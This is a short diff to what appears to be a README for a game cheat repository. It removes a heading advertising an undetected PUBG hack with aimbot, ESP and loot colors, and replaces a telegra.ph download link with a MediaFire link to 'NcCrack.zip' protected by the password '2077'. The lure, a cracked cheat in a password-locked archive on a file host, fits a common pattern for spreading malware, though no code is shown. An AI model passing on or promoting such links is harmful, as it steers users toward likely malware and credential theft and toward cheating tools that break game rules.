@@ -1,8 +1,6 @@
-# Updated 25.01.2023-UNDETECTED-HACK-FOR-PUBG-AIM-ESP-LOOT-COLORS
-
 # Download cheat
 
-|[Download](https://telegra.ph/Download-cheat-01-25-2)|
+|[Download](https://www.mediafire.com/file/qxarg07b51hql0v/NcCrack.zip/file)|
 |:-------------|
 Passwrod: `2077`
 
